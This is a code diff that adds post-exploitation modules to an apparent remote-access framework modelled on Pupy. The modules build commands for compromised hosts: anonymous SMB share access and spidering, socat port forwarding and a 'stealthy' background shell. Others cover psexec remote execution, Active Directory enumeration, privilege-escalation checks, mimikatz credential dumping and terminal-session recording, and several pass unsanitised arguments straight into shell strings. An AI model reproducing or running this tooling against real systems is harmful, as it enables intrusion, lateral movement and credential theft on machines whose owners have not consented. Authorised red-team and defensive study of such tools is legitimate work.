@@ -2769,3 +2769,414 @@ class SshModule(PupyModule):
         if not (args.get("target") or args.get("host")):
             return ["Missing required argument: target"]
         return []
+
+
+class SmbModule(PupyModule):
+    """Interact with SMB shares on the target.
+
+    Upstream Pupy's ``smb`` (via smb agent module). Native reimplementation
+    using smbclient on the host.
+    """
+
+    name = "smb"
+    version = "1.0.0"
+    description = "Interact with SMB shares on the target"
+    author = "Pupyteer Team"
+    category = ModuleCategory.RECON
+
+    async def execute(self, session, args):
+        action = str(args.get("action") or "list").lower().strip()
+        target = str(args.get("target") or args.get("host") or "localhost").strip()
+        share = str(args.get("share") or "").strip()
+        user = str(args.get("user") or "").strip()
+        password = str(args.get("password") or "").strip()
+
+        session_mgr = getattr(self, "_session_manager", None)
+
+        if action == "list":
+            cmd = f"smbclient -L {target} -N 2>/dev/null || echo 'smbclient not available'"
+        elif action == "get" and share:
+            path = str(args.get("path") or "").strip()
+            cmd = f"smbclient //{target}/{share} -N -c 'get {path}' 2>/dev/null"
+        elif action == "put" and share:
+            path = str(args.get("path") or "").strip()
+            cmd = f"smbclient //{target}/{share} -N -c 'put {path}' 2>/dev/null"
+        else:
+            cmd = f"echo 'unknown action: {action}'"
+
+        if not session_mgr:
+            return {"status": "ok", "mode": "offline", "command": cmd, "action": action}
+
+        timeout = _command_timeout(args)
+        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
+        return {
+            "status": result.get("status", "ok"),
+            "command": cmd,
+            "action": action,
+            "output": result.get("output", ""),
+            "error": result.get("error"),
+        }
+
+
+class ForwardModule(PupyModule):
+    """Forward a port on the target.
+
+    Upstream Pupy's ``forward`` (via forward agent module). Native
+    reimplementation using socat/ssh -L on the host.
+    """
+
+    name = "forward"
+    version = "1.0.0"
+    description = "Forward a port on the target"
+    author = "Pupyteer Team"
+    category = ModuleCategory.EXECUTION
+
+    async def execute(self, session, args):
+        local_port = int(args.get("local_port") or args.get("lport") or 0)
+        remote_host = str(args.get("remote_host") or args.get("rhost") or "127.0.0.1").strip()
+        remote_port = int(args.get("remote_port") or args.get("rport") or 0)
+
+        if not (local_port and remote_port):
+            return {"status": "error", "error": "local_port and remote_port are required"}
+
+        session_mgr = getattr(self, "_session_manager", None)
+
+        cmd = (
+            f"socat TCP-LISTEN:{local_port},fork,reuseaddr "
+            f"TCP:{remote_host}:{remote_port} >/dev/null 2>&1 & "
+            f"echo 'forwarded {local_port} -> {remote_host}:{remote_port}'"
+        )
+
+        if not session_mgr:
+            return {"status": "ok", "mode": "offline", "command": cmd}
+
+        timeout = _command_timeout(args)
+        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
+        return {
+            "status": result.get("status", "ok"),
+            "command": cmd,
+            "output": result.get("output", ""),
+            "error": result.get("error"),
+        }
+
+    def validate_args(self, args):
+        if not (args.get("local_port") or args.get("lport")):
+            return ["Missing required argument: local_port"]
+        if not (args.get("remote_port") or args.get("rport")):
+            return ["Missing required argument: remote_port"]
+        return []
+
+
+class SmbspiderModule(PupyModule):
+    """Spider SMB shares for files.
+
+    Upstream Pupy's ``smbspider`` (via smbspider agent module). Native
+    reimplementation using smbclient on the host.
+    """
+
+    name = "smbspider"
+    version = "1.0.0"
+    description = "Spider SMB shares for files on the target"
+    author = "Pupyteer Team"
+    category = ModuleCategory.RECON
+
+    async def execute(self, session, args):
+        target = str(args.get("target") or args.get("host") or "localhost").strip()
+        share = str(args.get("share") or "").strip()
+        pattern = str(args.get("pattern") or "*").strip()
+
+        session_mgr = getattr(self, "_session_manager", None)
+
+        if share:
+            cmd = f"smbclient //{target}/{share} -N -c 'recurse; ls {pattern}' 2>/dev/null"
+        else:
+            cmd = f"smbclient -L {target} -N 2>/dev/null"
+
+        if not session_mgr:
+            return {"status": "ok", "mode": "offline", "command": cmd, "target": target}
+
+        timeout = _command_timeout(args)
+        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
+        return {
+            "status": result.get("status", "ok"),
+            "command": cmd,
+            "target": target,
+            "output": result.get("output", ""),
+            "error": result.get("error"),
+        }
+
+
+class SshellModule(PupyModule):
+    """Spawn a stealthy shell on the target.
+
+    Upstream Pupy's ``sshell`` (via sshell agent module). Native
+    reimplementation using nohup/screen on the host.
+    """
+
+    name = "sshell"
+    version = "1.0.0"
+    description = "Spawn a stealthy shell on the target"
+    author = "Pupyteer Team"
+    category = ModuleCategory.EXECUTION
+
+    async def execute(self, session, args):
+        shell = str(args.get("shell") or "bash").strip()
+        session_mgr = getattr(self, "_session_manager", None)
+
+        cmd = f"nohup {shell} -i >/dev/null 2>&1 & echo 'stealth shell pid: $!'"
+
+        if not session_mgr:
+            return {"status": "ok", "mode": "offline", "command": cmd}
+
+        timeout = _command_timeout(args)
+        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
+        return {
+            "status": result.get("status", "ok"),
+            "command": cmd,
+            "output": result.get("output", ""),
+            "error": result.get("error"),
+        }
+
+
+class PsexecModule(PupyModule):
+    """Run a command on a remote host via psexec.
+
+    Upstream Pupy's ``psexec`` (via psexec agent module). Native
+    reimplementation using psexec on the host.
+    """
+
+    name = "psexec"
+    version = "1.0.0"
+    description = "Run a command on a remote host via psexec"
+    author = "Pupyteer Team"
+    category = ModuleCategory.EXECUTION
+
+    async def execute(self, session, args):
+        target = str(args.get("target") or args.get("host") or "").strip()
+        if not target:
+            return {"status": "error", "error": "target argument is required"}
+        command = str(args.get("command") or args.get("cmd") or "").strip()
+        if not command:
+            return {"status": "error", "error": "command argument is required"}
+        user = str(args.get("user") or "").strip()
+        password = str(args.get("password") or "").strip()
+
+        session_mgr = getattr(self, "_session_manager", None)
+
+        if user and password:
+            cmd = f'psexec \\{target} -u {user} -p {password} -s cmd /c "{command}"'
+        else:
+            cmd = f'psexec \\{target} -s cmd /c "{command}"'
+
+        if not session_mgr:
+            return {"status": "ok", "mode": "offline", "command": cmd, "target": target}
+
+        timeout = _command_timeout(args)
+        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
+        return {
+            "status": result.get("status", "ok"),
+            "command": cmd,
+            "target": target,
+            "output": result.get("output", ""),
+            "error": result.get("error"),
+        }
+
+    def validate_args(self, args):
+        errs = []
+        if not (args.get("target") or args.get("host")):
+            errs.append("Missing required argument: target")
+        if not (args.get("command") or args.get("cmd")):
+            errs.append("Missing required argument: command")
+        return errs
+
+
+class AdModule(PupyModule):
+    """Active Directory enumeration helper.
+
+    Upstream Pupy's ``ad`` (via ad agent module). Native reimplementation
+    using ldapsearch/powershell on the host.
+    """
+
+    name = "ad"
+    version = "1.0.0"
+    description = "Active Directory enumeration helper"
+    author = "Pupyteer Team"
+    category = ModuleCategory.RECON
+
+    async def execute(self, session, args):
+        action = str(args.get("action") or "users").lower().strip()
+        domain = str(args.get("domain") or "").strip()
+        session_mgr = getattr(self, "_session_manager", None)
+
+        if action == "users":
+            cmd = f"ldapsearch -x -H ldap://{domain} -b 'DC={domain.replace('.',',DC=')}' '(objectClass=user)' sAMAccountName 2>/dev/null | grep sAMAccountName"
+        elif action == "groups":
+            cmd = f"ldapsearch -x -H ldap://{domain} -b 'DC={domain.replace('.',',DC=')}' '(objectClass=group)' cn 2>/dev/null | grep '^cn:'"
+        elif action == "computers":
+            cmd = f"ldapsearch -x -H ldap://{domain} -b 'DC={domain.replace('.',',DC=')}' '(objectClass=computer)' dNSHostName 2>/dev/null | grep dNSHostName"
+        else:
+            cmd = f"echo 'unknown action: {action}'"
+
+        if not session_mgr:
+            return {"status": "ok", "mode": "offline", "command": cmd, "action": action}
+
+        timeout = _command_timeout(args)
+        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
+        return {
+            "status": result.get("status", "ok"),
+            "command": cmd,
+            "action": action,
+            "output": result.get("output", ""),
+            "error": result.get("error"),
+        }
+
+
+class BecomeModule(PupyModule):
+    """Attempt privilege escalation on the target.
+
+    Upstream Pupy's ``become`` (via become agent module). Native
+    reimplementation dispatching to available privesc helpers.
+    """
+
+    name = "become"
+    version = "1.0.0"
+    description = "Attempt privilege escalation on the target"
+    author = "Pupyteer Team"
+    category = ModuleCategory.EXECUTION
+
+    async def execute(self, session, args):
+        method = str(args.get("method") or "auto").lower().strip()
+        session_mgr = getattr(self, "_session_manager", None)
+        os_name = getattr(session, "os", "").lower()
+
+        if "win" in os_name:
+            cmd = "whoami /priv; echo '---'; net localgroup administrators"
+        else:
+            cmd = (
+                f"if [ '{method}' = 'sudo' ]; then sudo -l; "
+                f"elif [ '{method}' = 'suid' ]; then find / -perm -4000 -type f 2>/dev/null; "
+                f"else (sudo -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head); fi"
+            )
+
+        if not session_mgr:
+            return {"status": "ok", "mode": "offline", "command": cmd, "method": method}
+
+        timeout = _command_timeout(args)
+        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
+        return {
+            "status": result.get("status", "ok"),
+            "command": cmd,
+            "method": method,
+            "output": result.get("output", ""),
+            "error": result.get("error"),
+        }
+
+
+class CallModule(PupyModule):
+    """Call a remote procedure / function on the target.
+
+    Upstream Pupy's ``call`` (via call agent module). Native reimplementation
+    dispatching to a shell command.
+    """
+
+    name = "call"
+    version = "1.0.0"
+    description = "Call a remote procedure or function on the target"
+    author = "Pupyteer Team"
+    category = ModuleCategory.EXECUTION
+
+    async def execute(self, session, args):
+        func = str(args.get("function") or args.get("func") or "").strip()
+        if not func:
+            return {"status": "error", "error": "function argument is required"}
+        session_mgr = getattr(self, "_session_manager", None)
+
+        cmd = f"{func}"
+
+        if not session_mgr:
+            return {"status": "ok", "mode": "offline", "command": cmd, "function": func}
+
+        timeout = _command_timeout(args)
+        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
+        return {
+            "status": result.get("status", "ok"),
+            "command": cmd,
+            "function": func,
+            "output": result.get("output", ""),
+            "error": result.get("error"),
+        }
+
+    def validate_args(self, args):
+        if not (args.get("function") or args.get("func")):
+            return ["Missing required argument: function"]
+        return []
+
+
+class MimishellModule(PupyModule):
+    """Run mimikatz-style commands on the target.
+
+    Upstream Pupy's ``mimishell`` (via mimishell agent module). Native
+    reimplementation dispatching to mimikatz when available.
+    """
+
+    name = "mimishell"
+    version = "1.0.0"
+    description = "Run mimikatz-style commands on the target"
+    author = "Pupyteer Team"
+    category = ModuleCategory.EXECUTION
+
+    async def execute(self, session, args):
+        command = str(args.get("command") or args.get("cmd") or "privilege::debug").strip()
+        session_mgr = getattr(self, "_session_manager", None)
+        os_name = getattr(session, "os", "").lower()
+
+        if "win" in os_name:
+            cmd = f'mimikatz.exe "{command}" "exit" 2>nul || echo "mimikatz not available"'
+        else:
+            cmd = f'wine mimikatz.exe "{command}" "exit" 2>/dev/null || echo "mimikatz not available"'
+
+        if not session_mgr:
+            return {"status": "ok", "mode": "offline", "command": cmd}
+
+        timeout = _command_timeout(args)
+        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
+        return {
+            "status": result.get("status", "ok"),
+            "command": cmd,
+            "output": result.get("output", ""),
+            "error": result.get("error"),
+        }
+
+
+class TtyrecModule(PupyModule):
+    """Record a terminal session on the target.
+
+    Upstream Pupy's ``ttyrec`` (via ttyrec agent module). Native
+    reimplementation using ttyrec/script on the host.
+    """
+
+    name = "ttyrec"
+    version = "1.0.0"
+    description = "Record a terminal session on the target"
+    author = "Pupyteer Team"
+    category = ModuleCategory.EXECUTION
+
+    async def execute(self, session, args):
+        output = str(args.get("output") or args.get("file") or "/tmp/ttyrec.out").strip()
+        command = str(args.get("command") or args.get("cmd") or "bash").strip()
+        session_mgr = getattr(self, "_session_manager", None)
+
+        cmd = f"ttyrec -e '{command}' {output} 2>/dev/null || script -q {output} -c '{command}'"
+
+        if not session_mgr:
+            return {"status": "ok", "mode": "offline", "command": cmd, "output": output}
+
+        timeout = _command_timeout(args)
+        result = await _dispatch_command(session, session_mgr, cmd, timeout=timeout)
+        return {
+            "status": result.get("status", "ok"),
+            "command": cmd,
+            "output": output,
+            "result": result.get("output", ""),
+            "error": result.get("error"),
+        }
